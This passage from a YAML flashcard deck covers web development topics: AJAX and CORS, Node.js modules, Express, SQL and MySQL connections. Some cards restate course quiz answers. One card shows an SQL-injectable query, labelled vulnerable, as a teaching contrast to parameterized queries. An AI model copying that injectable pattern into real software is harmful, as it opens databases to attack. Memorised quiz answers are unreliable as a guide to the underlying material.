              http.createServer passes (req, res). req is readable (incoming data). res is writable (outgoing response).
              Calling write methods on req throws.
            example: "Correct: res.writeHead(200, ...); res.write(...); res.end();"
            lang: js
          - id: ajax-cors-card-12
            type: cloze
            bloom: apply
            source: Slide 5
            prompt: >
              The AJAX four-step lifecycle is: (1) create XMLHttpRequest, (2) attach {{onreadystatechange}} handler, (3)
              call open(), (4) call send().
            answer: onreadystatechange
            explanation: >
              The handler must be attached before open() and send() so it is registered before any state transitions can
              fire.
            example: xhttp.onreadystatechange = function() { if (this.readyState == 4 ...) { ... } };
          - id: ajax-cors-card-13
            type: name
            bloom: understand
            source: Slide 5
            prompt: Who configures CORS — the browser, the client script, or the server?
            answer: The server — CORS is implemented by adding Access-Control-Allow-* headers to the HTTP response.
            explanation: >
              SOP is enforced by the browser. CORS is the server's mechanism to signal that cross-origin access is
              permitted. The client script has no control over it.
            example: res.setHeader("Access-Control-Allow-Origin", "*");  // server-side
          - id: ajax-cors-card-14
            type: predict
            bloom: analyze
            source: Slide 5
            prompt: readyState is 2. What has just happened?
            answer: send() was called and the server returned response headers. The body has not yet arrived.
            explanation: >
              State 2 (HEADERS_RECEIVED) means the HTTP response headers are available via getResponseHeader(), but
              responseText is not yet populated.
            example: xhttp.getResponseHeader('Content-Type') is usable at readyState 2.
            lang: js
          - id: ajax-cors-card-15
            type: name
            bloom: remember
            source: Slide 5
            prompt: What does the withCredentials flag on XMLHttpRequest do?
            answer: >-
              Includes cookies and Authorization headers in cross-origin requests. Requires the server to name a
              specific origin (not *) and set Access-Control-Allow-Credentials: true.
            explanation: >
              Without withCredentials = true, cross-origin requests strip cookies and auth headers. With it, the browser
              sends them but enforces stricter CORS rules.
            example: xhttp.withCredentials = true;
      - id: nodejs-basics
        name: Node.js runtime and single-threaded non-blocking model
        tags:
          - nodejs
          - async
          - non-blocking
          - V8
          - server-scripting
        prose: >
          Node.js is a back-end JavaScript runtime built on the Chrome V8 engine. It runs single-threaded non-blocking,
          handling many concurrent requests via the event loop instead of creating one thread per request.
        source: Slide 4, Quiz 7
        cards:
          - id: nodejs-basics-card-01
            type: cloze
            prompt: |
              Node.js is built on {{Chrome V8 engine}}, which compiles JavaScript to {{native machine code}}.
            answer: Chrome V8 engine; native machine code
            bloom: remember
            source: Slide 4
            explanation: >
              V8 is Google's JavaScript engine. Compiling to native machine code gives Node.js competitive execution
              speed without an interpreter.
            example: |
              The same V8 engine runs inside Google Chrome to execute client-side JavaScript.
          - id: nodejs-basics-card-02
            type: cloze
            prompt: >
              Node.js executes JavaScript {{outside a web browser}} using a {{single-threaded non-blocking}} execution
              model.
            answer: outside a web browser; single-threaded non-blocking
            bloom: remember
            source: Slide 4
            explanation: >
              "Single-threaded non-blocking" is the professor's exact term. One thread handles all requests by
              delegating I/O to the OS and processing callbacks when results arrive.
            example: >
              A Node.js server receiving 100 file requests issues 100 async OS calls and processes all callbacks on one
              thread — no waiting.
          - id: nodejs-basics-card-03
            type: name
            prompt: >
              In the restaurant analogy, which example represents Node.js's execution model — where a single waiter
              takes orders at multiple tables without waiting for the kitchen?
            answer: Example 1 — single-threaded non-blocking
            bloom: understand
            source: Slide 4
            explanation: >
              Example 1: one waiter takes an order at Table 1, sends it to the kitchen, then immediately takes Table 2's
              order. The waiter never idles. This mirrors Node.js delegating I/O and moving to the next request.
            example: >
              Example 2 (blocking): the waiter stands at the kitchen window doing nothing until Table 1's meal is ready
              before going to Table 2.
          - id: nodejs-basics-card-04
            type: name
            prompt: >
              In the restaurant analogy, which example represents the traditional synchronous blocking model — where one
              waiter waits at the kitchen before serving the next table?
            answer: Example 2 — single-threaded blocking
            bloom: understand
            source: Slide 4
            explanation: >
              Example 2 shows one thread that blocks on I/O: it cannot handle the next request until the current one
              completes. This is the behaviour of naive synchronous server code (e.g. PHP/ASP.NET without async).
            example: >
              Equivalent Node.js code: using `fs.readFileSync()` in a request handler blocks the event loop for every
              other request while the file loads.
          - id: nodejs-basics-card-05
            type: name
            prompt: >
              In the restaurant analogy, which example represents a traditional multi-threaded server — one dedicated
              waiter per table?
            answer: Example 3 — multi-threaded (thread-per-request)
            bloom: understand
            source: Slide 4
            explanation: >
              Example 3 scales by adding waiters (threads) — one per table (request). Each thread blocks on its own I/O,
              but parallel threads mean no table waits for another. Memory cost grows linearly with concurrent users.
            example: |
              100 concurrent requests = 100 threads, all sitting blocked on I/O. Memory-inefficient at scale.
          - id: nodejs-basics-card-06
            type: name
            prompt: |
              A synchronous multi-threaded server receives 100 concurrent requests. How many threads does it create?
            answer: 100 threads — one per request
            bloom: remember
            source: Slide 4
            explanation: >
              Thread-per-request servers allocate one thread per concurrent connection. Each thread blocks on I/O, so
              memory scales with request count. Node.js handles the same 100 requests on one thread via non-blocking
              I/O.
            example: |
              At 100 concurrent users: synchronous server = 100 threads (100x memory cost). Node.js = 1 thread.
          - id: nodejs-basics-card-07
            type: predict
            lang: js
            prompt: >
              A Node.js server calls `fs.readFile('data.json', callback)`. List the steps in execution order: (A)
              callback fires, (B) thread returns to event loop, (C) OS signals file ready, (D) readFile called.
            code: |
              const fs = require('fs');
              const http = require('http');

              http.createServer((req, res) => {
                fs.readFile('data.json', 'utf8', (err, data) => {
                  res.end(data);
                });
                // what happens here immediately after readFile?
              }).listen(3000);
            answer: >-
              Order: D → B → C → A. readFile is called (D), thread immediately returns to event loop (B), OS later
              signals file ready (C), callback fires and res.end() runs (A).
            bloom: apply
            source: Slide 4
            explanation: >
              readFile is non-blocking: it registers the callback with the OS and returns immediately. The thread
              processes other requests. When the OS signals completion, the event loop dequeues the callback.
            example: |
              If the file takes 50 ms to read, the thread handles dozens of other requests during those 50 ms.
          - id: nodejs-basics-card-08
            type: name
            prompt: |
              Which of these is NOT a built-in Node.js module: `url`, `fs`, `http`, `mysql`?
            answer: mysql — it is a third-party npm package, not built-in
            bloom: remember
            source: Quiz 7
            explanation: >
              Built-in modules ship with Node.js: `url` parses URLs, `fs` handles the file system, `http` creates
              servers. `mysql` must be installed separately via npm.
            example: |
              `require('fs')` — no install needed. `require('mysql')` — requires `npm install mysql` first.
          - id: nodejs-basics-card-09
            type: name
            prompt: |
              Which built-in Node.js module handles file system operations (read, write, delete files)?
            answer: "`fs`"
            bloom: remember
            source: Quiz 7
            explanation: >
              The `fs` module exposes both synchronous (blocking) and asynchronous (non-blocking) file system methods.
              Use the async variants (`fs.readFile`, `fs.writeFile`) in request handlers to avoid blocking the event
              loop.
            example: |
              `fs.readFile('log.txt', 'utf8', (err, data) => { ... })` — non-blocking file read.
      - id: nodejs-modules
        name: "Node.js built-in modules: http, url, fs"
        tags:
          - modules
          - require
          - http
          - url
          - fs
          - npm
        prose: >
          Node.js ships three built-in modules used in every file server: http creates the server, url parses request
          URLs, and fs reads files from disk. External modules like mysql and express require npm install. Using
          pathname (not path) and res (not req) are the two most-tested distinctions.
        cards:
          - id: nodejs-modules-card-01
            type: name
            bloom: remember
            source: Quiz 7, Q1
            prompt: |
              Which of these is NOT a built-in Node.js module?
                A) http
                B) url
                C) mysql
                D) fs
            answer: |
              C) mysql. mysql is an external module — you must install it with `npm install mysql`.
              http, url, and fs ship with Node.js and need no installation.
            explanation: >
              Built-in modules are part of the Node.js runtime. External modules live in npm's registry and must be
              listed in package.json after installation.
            example: |
              const http = require('http');   // built-in — no install needed
              const mysql = require('mysql'); // external — npm install mysql first
          - id: nodejs-modules-card-02
            type: name
            bloom: remember
            source: Quiz 7, Q2
            prompt: Which built-in Node.js module gives you access to the file system?
            answer: "fs — the File System module. Load it with: const fs = require('fs');"
            explanation: >-
              fs exposes file I/O operations. The primary async method for reading files is fs.readFile(filename,
              callback).
            example: |
              const fs = require('fs');
              fs.readFile('index.html', function(err, data) {
                // err is null if successful; data holds the file contents
              });
          - id: nodejs-modules-card-03
            type: cloze
            bloom: understand
            source: Quiz 7, Q3; Slide 4
            prompt: |
              Given url.parse('http://localhost:8000/admin.html?user=123', true),
              {{parsed.pathname}} returns '/admin.html' and {{parsed.path}} returns '/admin.html?user=123'.
            answer: parsed.pathname; parsed.path
            explanation: |
              pathname stops at the '?' delimiter — it holds only the path segment.
              path includes the pathname PLUS the query string.
              Using path as a filename will fail because no file on disk is named '/admin.html?user=123'.
            example: |
              console.log(parsed.pathname); // '/admin.html'
              console.log(parsed.path);     // '/admin.html?user=123'
          - id: nodejs-modules-card-04
            type: predict
            bloom: apply
            source: Quiz 7, Q3; Slide 4
            prompt: |
              What does this code log?

                const url = require('url');
                const address = 'http://localhost:8000/admin.html?user=123';
                const parsed = url.parse(address, true);
                console.log(parsed.pathname);
            answer: /admin.html
            explanation: |
              pathname extracts the path component without the query string.
              The query string '?user=123' is separated into parsed.search and parsed.query, not included in pathname.
            example: "Common wrong answer: '/admin.html?user=123' — that is parsed.path, not parsed.pathname"
            lang: js
          - id: nodejs-modules-card-05
            type: predict
            bloom: analyze
            source: Quiz 7, Q4; Slide 4
            prompt: |
              What does this code send to the client?

                http.createServer(function(req, res) {
                  req.writeHead(200, { 'Content-Type': 'text/html' });
                  req.write('Hello');
                  req.end();
                }).listen(8000);
            answer: |
              Nothing — and it throws a TypeError at runtime.
              req.writeHead, req.write, and req.end are not functions on the request object.
              The response must be written through res, not req.
            explanation: |
              req is the IncomingMessage — it represents data flowing IN from the client.
              res is the ServerResponse — it represents data flowing OUT to the client.
              Only res has writeHead, write, and end.
            example: |
              // Correct:
              http.createServer(function(req, res) {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.write('Hello');
                res.end();
              }).listen(8000);
            lang: js
          - id: nodejs-modules-card-06
            type: cloze
            bloom: apply
            source: Quiz 7, Q5; Slide 4
            prompt: |
              To import a custom module at './modules/math.js', you write:
                const math = require({{./modules/math}});
            answer: ./modules/math
            explanation: >
              Custom modules always use a relative path beginning with './' or '../'.

              Without the './' prefix, Node.js looks in node_modules (built-in and npm packages), not the local
              filesystem.
            example: |
              const math = require('./modules/math');    // works
              const math2 = require('./modules/math.js'); // also works — .js extension optional
          - id: nodejs-modules-card-07
            type: name
            bloom: remember
            source: Slide 4, Slide 11
            prompt: What command installs an external npm module called 'express' and what file records it as a dependency?
            answer: "Install: npm install express (or: npm i express). Recorded in: package.json"
            explanation: >
              npm init --yes creates a package.json with default values.

              Every npm install adds the module to node_modules/ and records its version in package.json under
              "dependencies".
            example: |
              npm init --yes          # create package.json
              npm install express     # install and record dependency
          - id: nodejs-modules-card-08
            type: predict
            bloom: apply
            source: Slide 4
            prompt: |
              A Node.js http server is created but `.listen()` is never called. What happens when you run the file?
            answer: >-
              The server starts, then immediately exits — no port is bound, no connections are accepted. The process has
              nothing to keep it alive.
            explanation: |
              .listen(port) binds the server to a TCP port and keeps the event loop running.
              Without it, Node.js finishes executing the synchronous code and exits because no async work is pending.
            example: |
              // Missing .listen() — server exits immediately:
              http.createServer(function(req, res) { ... });
              // Correct:
              http.createServer(function(req, res) { ... }).listen(8080);
            lang: js
          - id: nodejs-modules-card-09
            type: name
            bloom: understand
            source: Slide 4
            prompt: What are the three response methods used inside http.createServer, and what does each do?
            answer: >
              res.writeHead(statusCode, headers) — sets HTTP status code and response headers. res.write(data) — sends a
              chunk of the response body. res.end() — signals the response is finished (required).
            explanation: >-
              writeHead must be called before write. end must always be called — without it the client hangs waiting for
              more data.
            example: |
              res.writeHead(200, { 'Content-Type': 'text/html' });
              res.write('<h1>Hello</h1>');
              res.end();
          - id: nodejs-modules-card-10
            type: cloze
            bloom: understand
            source: Slide 11
            prompt: |
              To read an environment variable named PORT in Node.js, you write:
                const port = {{process.env}}.PORT;
            answer: process.env
            explanation: |
              process.env is an object containing all environment variables set in the shell or OS.
              If PORT is not set, process.env.PORT returns undefined — not an error.
            example: const port = process.env.PORT;  // undefined if not set in environment
      - id: express-framework
        name: "Express: Routing, Middleware, RESTful Endpoints"
        tags:
          - express
          - routing
          - middleware
          - rest
          - npm
        prose: >-
          Express is an npm package that adds declarative routing and a composable middleware pipeline to Node.js. It is
          the standard framework for building RESTful APIs in Node.js server-side development.
        priority: mid
        source: Slide 8
        cards:
          - id: express-framework-card-01
            type: cloze
            prompt: >-
              To install Express in a Node.js project, first run {{npm init --yes}} to create package.json, then run
              {{npm install express}} to add the package.
            answer: npm init --yes; npm install express
            bloom: remember
            source: Slide 8
            explanation: >-
              npm init --yes creates package.json, which records installed packages as dependencies. Without it, running
              npm install still downloads the package but does not lock the version for reproducible installs.
            example: "`npm init --yes && npm install express` — the two commands that scaffold an Express project from scratch."
          - id: express-framework-card-02
            type: name
            prompt: What is middleware in the context of Express?
            answer: >-
              An Express function in the request pipeline that can read, modify, or short-circuit the request before the
              route handler.
            bloom: understand
            source: Slide 8
            explanation: >-
              Middleware is registered with app.use() and runs in order before the matching route handler. A middleware
              that does not call next() and does not send a response will stall the request.
            example: >-
              `app.use(express.json())` is middleware that parses incoming JSON bodies and populates req.body before any
              route handler runs.
          - id: express-framework-card-03
            type: name
            prompt: What is the difference between PUT and PATCH in a RESTful API?
            answer: PUT replaces the entire resource. PATCH updates a single property.
            bloom: understand
            source: Slide 8
            explanation: >-
              Sending a PUT with only a subset of fields erases the omitted fields — the whole record is replaced. PATCH
              is a surgical update; only the named property changes. These are distinct operations and should not be
              used interchangeably.
            example: >-
              PUT /api/v1/patients/1 with body `{name: 'Ali'}` replaces the full patient record. PATCH
              /api/v1/patients/1 with `{name: 'Ali'}` changes only the name field.
          - id: express-framework-card-04
            type: cloze
            prompt: >-
              To list all patients, the client calls {{GET}} {{/api/v1/patients/}}. To get a single patient with id 3,
              the client calls {{GET}} {{/api/v1/patients/3}}.
            answer: GET /api/v1/patients/; GET /api/v1/patients/3
            bloom: apply
            source: Slide 8
            explanation: >-
              The collection URL returns all resources. Appending /:id scopes the request to one resource. This URL
              design follows RESTful convention — the resource name is plural and the id is a path segment, not a query
              parameter.
            example: >-
              `app.get('/api/v1/patients', handler)` catches the list-all request. `app.get('/api/v1/patients/:id',
              handler)` catches the single-resource request; the id is available as req.params.id.
          - id: express-framework-card-05
            type: cloze
            prompt: >-
              To read the server port from an environment variable with a local fallback, write: `const PORT =
              {{process.env.PORT}} || {{8888}}`.
            answer: process.env.PORT; 8888
            bloom: apply
            source: Slide 8
            explanation: >-
              process.env.PORT reads the PORT variable set by the hosting platform. If not set, the value is undefined,
              so the || fallback kicks in. Hard-coding the port breaks deployment to platforms that assign ports
              dynamically.
            example: >-
              `const PORT = process.env.PORT || 8888;` — undefined || 8888 evaluates to 8888 in local development, and
              the platform-assigned port in production.
          - id: express-framework-card-06
            type: name
            prompt: Is POST idempotent? Explain why.
            answer: >-
              No. POST creates a new resource each time it is called, so repeated identical requests produce multiple
              records.
            bloom: understand
            source: Slide 8
            explanation: >-
              An operation is idempotent if applying it multiple times produces the same result as applying it once.
              POST violates this: each call creates an additional server-side resource. PUT is idempotent — applying the
              same replacement twice leaves the record in the same state.
            example: >-
              POST /api/v1/patients twice creates two patient records. PUT /api/v1/patients/1 twice leaves one patient
              record in the replaced state — the second call changes nothing observable.
          - id: express-framework-card-07
            type: cloze
            prompt: >-
              The CORS middleware header {{Access-Control-Allow-Origin}} permits any origin. The header
              {{Access-Control-Allow-Headers}} is required when the browser preflight includes Content-Type.
            answer: Access-Control-Allow-Origin; Access-Control-Allow-Headers
            bloom: apply
            source: Slide 8
            explanation: >-
              Browsers send a preflight OPTIONS request for cross-origin requests that carry Content-Type:
              application/json. The server must respond with Access-Control-Allow-Headers: Content-Type or the preflight
              fails and the actual request is never sent.
            example: |
              res.setHeader('Access-Control-Allow-Origin', '*');
              res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
          - id: express-framework-card-08
            type: name
            prompt: What happens if a custom middleware function does not call next() and does not send a response?
            answer: The request stalls permanently — the client never receives a response and the connection times out.
            bloom: understand
            source: Slide 8
            explanation: >-
              next() passes control to the next middleware in the pipeline or to the matched route handler. Without it
              and without res.send()/res.json(), Express has nowhere to forward the request and the pipeline stops
              silently.
            example: >-
              CORS middleware must call next() after setting headers; omitting next() means GET /api/v1/patients never
              reaches the app.get handler and the browser receives no response.
  - id: m4-databases-crud
    name: Databases and CRUD
    topics:
      - id: db-relational-design
        name: "Relational DB design: keys, relationships, and normalization"
        tags:
          - MySQL
          - primary-key
          - foreign-key
          - 1NF
          - 2NF
          - referential-integrity
          - 1:M
          - M:M
        prose: >
          A relational database stores each entity in its own table. A primary key uniquely identifies each row; a
          foreign key links a child table to a parent table's primary key. That link encodes a 1:M relationship. M:M
          relationships require a junction table. Referential integrity guarantees every foreign key value points to an
          existing primary key. First normal form (1NF) requires atomic values per cell. Second normal form (2NF)
          requires every non-key column to depend on the whole primary key.
        cards:
          - id: db-relational-design-card-01
            type: cloze
            bloom: remember
            source: Slide 7
            prompt: A {{primary key}} is a column that uniquely identifies each row in a table and cannot be NULL.
            answer: primary key
            explanation: >
              The primary key enforces row uniqueness. Every table should have one. The patientid column in the Patient
              table is a primary key.
            example: |
              In CREATE TABLE patient, the line PRIMARY KEY(patientid) declares patientid as the primary key.
          - id: db-relational-design-card-02
            type: cloze
            bloom: remember
            source: Slide 7
            prompt: A {{foreign key}} is a column in a child table that references the primary key of a parent table.
            answer: foreign key
            explanation: >
              The foreign key is the link between tables. patientid in the Visit table is a foreign key referencing
              patientid in Patient.
            example: |
              CONSTRAINT fk_has_patient FOREIGN KEY(patientid) REFERENCES patient(patientid)
          - id: db-relational-design-card-03
            type: cloze
            bloom: understand
            source: Slide 7
            prompt: >
              {{Referential integrity}} means every foreign key value in a child table has a matching primary key value
              in the parent table.
            answer: Referential integrity
            explanation: >
              Deleting a parent row with matching child rows breaks referential integrity. MySQL blocks such deletions
              when a foreign key constraint is active.
            example: >
              Deleting a patient row that has visit rows violates referential integrity — the visit rows become orphans
              pointing to a non-existent patient.
          - id: db-relational-design-card-04
            type: cloze
            bloom: understand
            source: Slide 7, Quiz 10
            prompt: >
              A table satisfies {{first normal form (1NF)}} when every column holds one atomic value per row and no
              repeating groups exist.
            answer: first normal form (1NF)
            explanation: >
              Storing multiple visit dates in one column violates 1NF. Splitting into separate visit rows with one date
              each satisfies 1NF.
            example: >
              A Patient table with visitDate1, visitDate2 columns violates 1NF. A separate Visit table with one
              visitDate per row satisfies 1NF.
          - id: db-relational-design-card-05
            type: cloze
            bloom: analyze
            source: Slide 10, Quiz 10
            prompt: >
              A table satisfies {{second normal form (2NF)}} when it satisfies 1NF and every non-key column depends on
              the entire primary key, not a subset.
            answer: second normal form (2NF)
            explanation: >
              A table with PersonID (PK), Name, City, Country satisfies 1NF but violates 2NF because Country depends on
              City, not on PersonID.
            example: >
              ISAQuiz10 Q5: professor's answer is "violates 2NF, but complies with 1NF" — atomic values (1NF passes) but
              City/Country depend on each other (2NF fails).
          - id: db-relational-design-card-06
            type: predict
            bloom: apply
            source: Slide 7, Quiz 10
            prompt: |
              The patient table has 3 rows. The visit table has 3 rows. What does `SELECT * FROM patient, visit` return?
            answer: 9 rows — the Cartesian product of 3 × 3.
            explanation: >
              A Cartesian join pairs every row from the first table with every row from the second. Identical column
              names do NOT reduce the row count.
            example: >
              ISAQuiz10 Q6: distractors claim column name collision reduces row count. It does not. Result is always n ×
              m rows.
            lang: sql
          - id: db-relational-design-card-07
            type: diagram
            bloom: analyze
            source: Quiz 10, Q4
            prompt: >
              Two tables are shown below. Identify the relationship type between them.

              person table: personID (PK), name, dob birthCertificate table: certID (PK), personID (FK UNIQUE),
              issueDate

              The personID column in birthCertificate is UNIQUE — no person appears twice.
            labels:
              "???REL": "1:1"
            mermaid: |
              erDiagram
                person ||--|| birthCertificate : "???REL"
                person { int personID }
                birthCertificate { int certID int personID }
            answer: 1:1 — one person has exactly one birth certificate.
            explanation: >
              When the foreign key column in the child table is unique, each parent row maps to at most one child row.
              That is a 1:1 relationship, not 1:M.
            example: >
              ISAQuiz10 Q4: person/birthCertificate is a classic 1:1. Contrast with Patient/Visit (one patient, many
              visits) which is 1:M.
          - id: db-relational-design-card-08
            type: name
            bloom: apply
            source: Slide 7
            prompt: >
              An Author table and a Book table need a M:M relationship. What table structure resolves this, and what is
              its primary key?
            answer: |
              Add a junction table (AuthorBook) with a composite primary key made of authorid (FK) and bookid (FK).
            explanation: >
              No single foreign key can represent M:M. A junction table decomposes the M:M into two 1:M relationships.
              The composite PK uniquely identifies each author-book pairing.
            example: |
              AuthorBook(authorid FK, bookid FK, PRIMARY KEY(authorid, bookid))
      - id: sql-crud
        name: "SQL CRUD: querying and modifying data"
        tags:
          - SQL
          - SELECT
          - INSERT
          - UPDATE
          - DELETE
          - WHERE
          - JOIN
          - CRUD
          - GROUP-BY
          - subquery
        prose: >-
          SQL CRUD covers SELECT, INSERT, UPDATE, DELETE along with filtering (WHERE), grouping (GROUP BY/HAVING),
          pattern matching (LIKE), joins, and subqueries. The most common exam traps are WHERE on aggregates (use
          HAVING), bare-comma joins (Cartesian product), and IS vs = for string comparisons.
        cards:
          - id: sql-crud-card-01
            type: cloze
            source: Slide 7
            bloom: remember
            prompt: HAVING filters {{aggregated groups after GROUP BY}}; WHERE filters individual rows before grouping.
            answer: aggregated groups after GROUP BY
            explanation: >-
              WHERE runs before GROUP BY and cannot see aggregate results. HAVING runs after GROUP BY and can filter on
              COUNT, AVG, etc.
            example: |
              SELECT Country, COUNT(CustomerID) AS c
              FROM Customers
              GROUP BY Country
              HAVING c > 2;
          - id: sql-crud-card-02
            type: predict
            source: Slide 7
            bloom: apply
            prompt: The patient table has 3 rows. The visit table has 3 rows. What does `SELECT * FROM patient, visit` return?
            answer: 9 rows — the Cartesian product pairs every patient row with every visit row.
            explanation: >-
              A bare comma in FROM produces a Cartesian product. The correct equi-join adds WHERE patient.patientid =
              visit.patientid to return only matched rows.
            example: |
              -- Cartesian (wrong)
              SELECT * FROM patient, visit;
              -- Equi-join (right)
              SELECT * FROM patient, visit
              WHERE patient.patientid = visit.patientid;
            lang: sql
          - id: sql-crud-card-03
            type: name
            source: Slide 7, Quiz 10
            bloom: remember
            prompt: Which SQL keyword retrieves only unique values from a column?
            answer: DISTINCT
            explanation: SELECT DISTINCT Country FROM Customers returns one row per unique country value, eliminating duplicates.
            example: |
              SELECT DISTINCT Country FROM Customers;
          - id: sql-crud-card-04
            type: cloze
            source: Slide 7, Quiz 10
            bloom: apply
            prompt: >-
              Use {{parameterized queries}} with `?` placeholders — never string interpolation — to prevent SQL
              injection.
            answer: parameterized queries
            explanation: >-
              Template-literal SQL concatenates user input directly into the query string. Parameterized queries pass
              data as a separate argument; the driver treats it as data, never as SQL syntax.
            example: |
              // Vulnerable
              db.query(`SELECT * FROM users WHERE name = '${input}'`);
              // Safe
              db.query('SELECT * FROM users WHERE name = ?', [input]);
          - id: sql-crud-card-05
            type: cloze
            source: Slide 7, Quiz 10
            bloom: remember
            prompt: In a LIKE pattern, `%` matches {{zero or more characters}} and `_` matches exactly one character.
            answer: zero or more characters
            explanation: >-
              LIKE is used in WHERE clauses for pattern matching. WHERE Country LIKE 'A%' returns every country starting
              with 'A'.
            example: |
              SELECT * FROM Customers WHERE Country LIKE 'A%';
              SELECT * FROM Customers WHERE name LIKE 'a%' OR name LIKE 'B%';
          - id: sql-crud-card-06
            type: predict
            source: Quiz 10
            bloom: analyze
            prompt: A developer writes `WHERE department is 'HR'`. What is wrong and what is the fix?
            answer: "Syntax error. `IS` tests for NULL, not string equality. Fix: `WHERE department = 'HR'`."
            explanation: "`IS` and `IS NOT` are reserved for NULL comparisons. The equality operator = handles string comparisons."
            example: |
              -- Wrong
              SELECT * FROM Employees WHERE department is 'HR';
              -- Right
              SELECT * FROM Employees WHERE department = 'HR';
            lang: sql
          - id: sql-crud-card-07
            type: name
            source: Slide 7
            bloom: apply
            prompt: Write a SQL query returning every product whose price exceeds the catalogue average.
            answer: SELECT * FROM Products WHERE price > (SELECT AVG(price) FROM Products);
            explanation: >-
              The inner SELECT returns the average price as a scalar. The outer WHERE compares each row's price against
              it.
            example: |
              SELECT * FROM Products
              WHERE price > (SELECT AVG(price) FROM Products);
      - id: sql-promises
        name: "Async DB queries with promises: chaining successive SQL calls"
        tags:
          - promises
          - async-db
          - mysql
          - chaining
          - successive-queries
        prose: >
          The mysql module's .promise() method wraps a connection and returns a promise-based query interface.
          Successive SQL statements that depend on each other's results must be chained with .then() or await to
          guarantee ordering. Firing queries without awaiting previous results produces a race condition.
        cards:
          - id: sql-promises-card-01
            type: cloze
            source: Slide 11
            bloom: remember
            prompt: The mysql module method that returns a promise-based query interface is `con.{{promise}}()`.
            answer: promise
            explanation: >
              con.promise() wraps the existing connection object and returns a new object whose query() method returns a
              Promise instead of taking a callback.
            example: |
              const promiseCon = con.promise();
              promiseCon.query('SELECT ...', [id]); // returns a Promise
          - id: sql-promises-card-02
            type: cloze
            source: Slide 11
            bloom: understand
            prompt: >-
              When `con.promise().query()` resolves, it yields an array `{{[rows, fields]}}` — destructure the first
              element to get result rows.
            answer: "[rows, fields]"
            explanation: >
              mysql resolves promise queries with a two-element array: rows (the query results) and fields (column
              metadata). Destructuring with const [rows] = await ... gives direct access to the result objects.
            example: |
              const [rows] = await promiseCon.query('SELECT * FROM patient WHERE patientid = ?', [id]);
          - id: sql-promises-card-03
            type: cloze
            source: Slide 11
            bloom: analyze
            prompt: >-
              Running an UPDATE without first awaiting the SELECT result produces a {{race condition}} — the check and
              write are not sequenced.
            answer: race condition
            explanation: >
              Without await or .then() chaining, both queries enter the MySQL queue simultaneously. The UPDATE can
              execute before the SELECT result arrives, bypassing the existence check.
            example: |
              // Wrong — no ordering guarantee:
              promiseCon.query('SELECT ...', [id]);
              promiseCon.query('UPDATE ...', [data, id]);
              // Correct:
              const [rows] = await promiseCon.query('SELECT ...', [id]);
              if (rows.length === 0) throw new Error('Not found');
              await promiseCon.query('UPDATE ...', [data, id]);
          - id: sql-promises-card-04
            type: name
            source: Slide 5, Slide 11
            bloom: remember
            prompt: What Node.js command installs the mysql module?
            answer: npm install mysql
            explanation: >
              mysql is not a built-in Node.js module. Node.js uses a module resolution algorithm that looks in
              node_modules/; npm install mysql places the package there, making require('mysql') succeed. The
              package.json entry records the dependency but is not itself the mechanism.
            example: |
              npm install mysql
              // Then: const mysql = require('mysql');
          - id: sql-promises-card-05
            type: predict
            source: Slide 11
            bloom: apply
            prompt: |
              Trace this chain. What is `rows` inside the first `.then()` if one patient matches?

              ```js
              promiseCon
                .query('SELECT * FROM patient WHERE patientid = ?', [7])
                .then(([rows]) => {
                  return promiseCon.query('UPDATE patient SET name = ? WHERE patientid = ?', ['Alice', 7]);
                });
              ```
            answer: "rows is an array with one object: [{ patientid: 7, ... }]"
            explanation: >
              mysql resolves with [rows, fields]. The destructuring [rows] extracts the first element — the array of
              result row objects. One matching record means rows.length === 1.
            example: |
              // rows = [{ patientid: 7, name: 'Bob', ... }]
            lang: sql
          - id: sql-promises-card-06
            type: cloze
            source: Slide 11
            bloom: understand
            prompt: >-
              To sequence SELECT then UPDATE, return the second `promiseCon.query()` call {{inside the .then() handler}}
              of the first.
            answer: inside the .then() handler
            explanation: >
              Returning a Promise from inside a .then() handler causes the next .then() to wait for that returned
              Promise to settle. This enforces sequential execution.
            example: |
              promiseCon.query('SELECT ...', [id])
                .then(([rows]) => {
                  if (rows.length === 0) throw new Error('Not found');
                  return promiseCon.query('UPDATE ...', [data, id]);
                })
                .catch(err => { /* handles both */ });
      - id: nodejs-db-connect
        name: Node.js MySQL connection, mysql module, executing queries, XAMPP/phpMyAdmin, cPanel hosting
        tags:
          - mysql
          - nodejs
          - npm
          - XAMPP
          - phpMyAdmin
          - cPanel
          - hosting
        prose: >-
          The mysql package is an external Node.js module. Install with npm install mysql, then use createConnection,
          connect, and query to talk to a MySQL database. Keep all connection code server-side. Use XAMPP locally (MySQL
          + phpMyAdmin), cPanel for production.
        cards:
          - id: nodejs-db-connect-card-01
            type: cloze
            source: Slide 5, Quiz 7
            bloom: remember
            prompt: The mysql module is {{not a built-in}} Node.js module — install it with `npm install mysql`.
            answer: not a built-in
            explanation: >-
              Built-in modules (url, http, fs, path, os) require no installation. The mysql package lives in npm and
              must be explicitly installed.
            example: "Running node app.js without installing mysql throws: Error: Cannot find module 'mysql'."
          - id: nodejs-db-connect-card-02
            type: name
            source: Slide 5
            bloom: remember
            prompt: What four properties does `mysql.createConnection()` accept to identify the target database?
            answer: host, user, password, and database (schema name).
            explanation: >-
              These four properties tell the mysql driver where the server is, how to authenticate, and which schema to
              use.
            example: "mysql.createConnection({ host: 'localhost', user: 'root', password: '', database: 'mydb' })"
          - id: nodejs-db-connect-card-03
            type: predict
            source: Slide 5, Quiz 7
            bloom: apply
            prompt: >-
              You log `result` on the line immediately after `con.query(sql, callback)` — outside the callback. What
              does the log show?
            answer: >-
              undefined. con.query is asynchronous — the database has not responded yet. result is only defined inside
              the callback.
            explanation: >-
              Node.js dispatches the query and continues running synchronous code. The callback fires later when MySQL
              responds.
            example: con.query('SELECT...', cb); console.log(result); // undefined — callback has not fired yet
            lang: sql
          - id: nodejs-db-connect-card-04
            type: cloze
            source: Quiz 7
            bloom: analyze
            prompt: >-
              Placing MySQL connection credentials in client-side code exposes your {{username and password}} to anyone
              who views page source.
            answer: username and password
            explanation: >-
              Browser JavaScript is downloaded to every visitor and readable via DevTools → Sources. A client-side
              mysql.createConnection means the DB password is embedded in public code — any user can extract it and
              connect to the database directly, bypassing all server-side authorization.
            example: >-
              A visitor opens DevTools → Sources and reads password: 'db_secret_123' — full DB access gained without
              authenticating to the app.
          - id: nodejs-db-connect-card-05
            type: name
            source: Slide 5, Slide 7
            bloom: remember
            prompt: What tool does XAMPP install alongside the MySQL engine for visual database management?
            answer: >-
              phpMyAdmin — a browser-based admin interface at http://localhost/phpmyadmin/ for creating databases,
              tables, and running SQL queries.
            explanation: >-
